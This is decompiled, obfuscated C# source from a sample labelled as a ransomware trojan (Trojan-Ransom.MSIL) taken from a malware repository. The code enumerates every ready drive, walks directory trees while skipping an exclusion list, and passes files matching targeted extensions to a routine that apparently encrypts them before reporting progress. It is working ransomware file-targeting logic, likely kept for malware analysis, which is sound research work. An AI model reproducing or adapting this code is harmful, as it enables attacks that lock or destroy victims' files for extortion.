// Decompiled with JetBrains decompiler
// Type:  
// Assembly: RingBell, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 126B6CA2-9E8E-4E8F-B66A-E8ED3E4C478A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-8b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

internal sealed class \u000E\u2000
{
  public List<string> \u0002 = new List<string>();
  public bool \u0003 = false;
  public string \u0005;
  public \u0008\u2000 \u0008;
  public int \u0006 = 0;
  public List<string> \u000E = new List<string>();
  public List<string> \u000F = new List<string>();
  public int \u0002\u2000 = 0;

  public \u000E\u2000()
  {
    List<string> stringList1 = this.\u000E;
    char[] chArray1 = new char[1]{ '|' };
    stringList1.Add(\u0008\u2001.\u0002(-2094345772).Split(chArray1)[0]);
    List<string> stringList2 = this.\u000E;
    char[] chArray2 = new char[1]{ '|' };
    stringList2.Add(\u0008\u2001.\u0002(-2094345970).Split(chArray2)[0]);
    List<string> stringList3 = this.\u000E;
    char[] chArray3 = new char[1]{ '|' };
    stringList3.Add(\u0008\u2001.\u0002(-2094345967).Split(chArray3)[0]);
    List<string> stringList4 = this.\u000E;
    char[] chArray4 = new char[1]{ '|' };
    stringList4.Add(\u0008\u2001.\u0002(-2094345932).Split(chArray4)[0]);
    List<string> stringList5 = this.\u000E;
    char[] chArray5 = new char[1]{ '|' };
    stringList5.Add(\u0008\u2001.\u0002(-2094345901).Split(chArray5)[0]);
    List<string> stringList6 = this.\u000E;
    char[] chArray6 = new char[1]{ '|' };
    stringList6.Add(\u0008\u2001.\u0002(-2094345860).Split(chArray6)[0]);
  }

  public IEnumerable<string> \u0002(string _param1) => (IEnumerable<string>) new \u000E\u2000.\u0002(-2)
  {
    \u000E = this,
    \u0006 = _param1
  };

  public string \u0002(string _param1)
  {
    string str = string.Empty;
    if (Directory.Exists(_param1))
    {
      foreach (string directory in Directory.GetDirectories(_param1))
      {
        if (this.\u0002(directory))
        {
          char[] chArray = new char[1]{ '|' };
          str = str + directory + \u0008\u2001.\u0002(-2094343391).Split(chArray)[0];
        }
      }
    }
    return str;
  }

  public void \u0002(string _param1)
  {
    this.\u0008.\u0005\u2002 = false;
    this.\u0002.Clear();
    this.\u000F.Clear();
    this.\u0002\u2000 = 0;
    this.\u0006 = 0;
    char[] chArray1 = new char[1]{ '<' };
    string[] strArray = _param1.Split(chArray1);
    if (strArray.Length <= 1)
      return;
    string str1 = strArray[0];
    char[] chArray2 = new char[1]{ '>' };
    foreach (string str2 in str1.Split(chArray2))
    {
      if (str2 != string.Empty)
        this.\u0002.Add(str2);
    }
    if (!(strArray[1] != string.Empty))
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      this.\u0003 = true;
      foreach (DriveInfo driveInfo in drives)
      {
        if (driveInfo.IsReady)
          this.\u0003(driveInfo.Name);
      }
      \u0008\u2000 obj = this.\u0008;
      char[] chArray3 = new char[1]{ '!' };
      obj.\u0002((byte[]) null, \u0008\u2001.\u0002(-2094346091).Split(chArray3)[0], false);
      this.\u0003 = false;
    }
    else
    {
      this.\u0003 = true;
      this.\u0003(strArray[1]);
      this.\u0003 = false;
      \u0008\u2000 obj = this.\u0008;
      char[] chArray4 = new char[1]{ '!' };
      obj.\u0002((byte[]) null, \u0008\u2001.\u0002(-2094346045).Split(chArray4)[0], false);
    }
  }

  public string \u0002()
  {
    string str = string.Empty;
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (drive.IsReady)
      {
        string name = drive.Name;
        char[] chArray = new char[1]{ '!' };
        str = str + name + \u0008\u2001.\u0002(-2094343649).Split(chArray)[0];
      }
    }
    return str;
  }

  public string \u0003(string _param1)
  {
    string str = string.Empty;
    if (Directory.Exists(_param1))
    {
      foreach (string file in Directory.GetFiles(_param1))
      {
        char[] chArray = new char[1]{ '|' };
        str = str + file + \u0008\u2001.\u0002(-2094343391).Split(chArray)[0];
      }
    }
    return str;
  }

  public bool \u0002(string _param1)
  {
    DirectoryInfo directoryInfo = new DirectoryInfo(_param1);
    bool flag;
    try
    {
      directoryInfo.GetDirectories();
      flag = true;
    }
    catch (Exception ex)
    {
      flag = false;
      ex.GetType();
    }
    return flag;
  }

  public void \u0003(string _param1)
  {
    try
    {
      foreach (string str1 in this.\u0002(_param1))
      {
        char[] chArray1 = new char[1]{ '!' };
        int startIndex = str1.LastIndexOf(\u0008\u2001.\u0002(-2094345510).Split(chArray1)[0]);
        if (startIndex < 0)
          startIndex = 0;
        if (this.\u0002.Contains(str1.Substring(startIndex).ToLower()))
        {
          string str2 = this.\u0008.\u000E.\u0002(str1, true);
          \u0008\u2000 obj = this.\u0008;
          char[] chArray2 = new char[1]{ '!' };
          string str3 = \u0008\u2001.\u0002(-2094345989).Split(chArray2)[0];
          char[] chArray3 = new char[1]{ '!' };
          obj.\u0002((byte[]) null, str3 + str1 + \u0008\u2001.\u0002(-2094346213).Split(chArray3)[0] + str2, false);
        }
        if (this.\u0008.\u0005\u2002)
          break;
      }
    }
    catch
    {
    }
  }

  private sealed class \u0002 : 
    IEnumerable<string>,
    IEnumerable,
    IEnumerator<string>,
    IDisposable,
    IEnumerator
  {
    private int \u0002;
    private string \u0003;
    private int \u0005;
    private string \u0008;
    public string \u0006;
    public \u000E\u2000 \u000E;
    private bool \u000F;
    private Queue<string> \u0002\u2000;
    private string[] \u0003\u2000;
    private string[] \u0005\u2000;
    private int \u0008\u2000;
    private string \u0006\u2000;
    private int \u000E\u2000;

    [DebuggerHidden]
    public \u0002(int _param1)
    {
      this.\u0002 = _param1;
      this.\u0005 = Environment.CurrentManagedThreadId;
    }

    [DebuggerHidden]
    void IDisposable.\u0002\u2005\u2003\u2005\u2007\u0002()
    {
    }

    bool IEnumerator.MoveNext()
    {
      switch (this.\u0002)
      {
        case 0:
          this.\u0002 = -1;
          this.\u0002\u2000 = new Queue<string>();
          this.\u0002\u2000.Enqueue(this.\u0008);
          break;
        case 1:
          this.\u0002 = -1;
          ++this.\u000E\u2000;
          goto label_16;
        default:
          return false;
      }
label_3:
      this.\u000F = this.\u0002\u2000.Count > 0 && !this.\u000E.\u0008.\u0005\u2002;
      if (!this.\u000F)
        return false;
      this.\u0008 = this.\u0002\u2000.Dequeue();
      try
      {
        this.\u0005\u2000 = Directory.GetDirectories(this.\u0008);
        for (this.\u0008\u2000 = 0; this.\u0008\u2000 < this.\u0005\u2000.Length; ++this.\u0008\u2000)
        {
          this.\u0006\u2000 = this.\u0005\u2000[this.\u0008\u2000];
          if (this.\u000E.\u0002(this.\u0006\u2000) && !this.\u000E.\u000E.Contains(this.\u0006\u2000.ToLower()))
            this.\u0002\u2000.Enqueue(this.\u0006\u2000);
          this.\u0006\u2000 = (string) null;
        }
        this.\u0005\u2000 = (string[]) null;
      }
      catch
      {
      }
      this.\u0003\u2000 = Directory.GetFiles(this.\u0008);
      if (this.\u0003\u2000 != null)
        this.\u000E\u2000 = 0;
      else
        goto label_17;
label_16:
      if (this.\u000E\u2000 < this.\u0003\u2000.Length)
      {
        this.\u0003 = this.\u0003\u2000[this.\u000E\u2000];
        this.\u0002 = 1;
        return true;
      }
label_17:
      this.\u0003\u2000 = (string[]) null;
      goto label_3;
    }

    [DebuggerHidden]
    string IEnumerator<string>.\u0002\u2005\u2003\u2005\u2007\u0002() => this.\u0003;

    [DebuggerHidden]
    void IEnumerator.\u0002\u2005\u2003\u2005\u2007\u0003() => throw new NotSupportedException();

    [DebuggerHidden]
    object IEnumerator.\u0002\u2005\u2003\u2005\u2007\u0002() => (object) this.\u0003;

    [DebuggerHidden]
    IEnumerator<string> IEnumerable<string>.\u0002\u2005\u2003\u2005\u2007\u0002()
    {
      \u000E\u2000.\u0002 obj;
      if (this.\u0002 == -2 && this.\u0005 == Environment.CurrentManagedThreadId)
      {
        this.\u0002 = 0;
        obj = this;
      }
      else
      {
        obj = new \u000E\u2000.\u0002(0);
        obj.\u000E = this.\u000E;
      }
      obj.\u0008 = this.\u0006;
      return (IEnumerator<string>) obj;
    }

    [DebuggerHidden]
    IEnumerator IEnumerable.\u0002\u2005\u2003\u2005\u2007\u0002() => (IEnumerator) this.\u0002\u2005\u2003\u2005\u2007\u0002();
  }
}
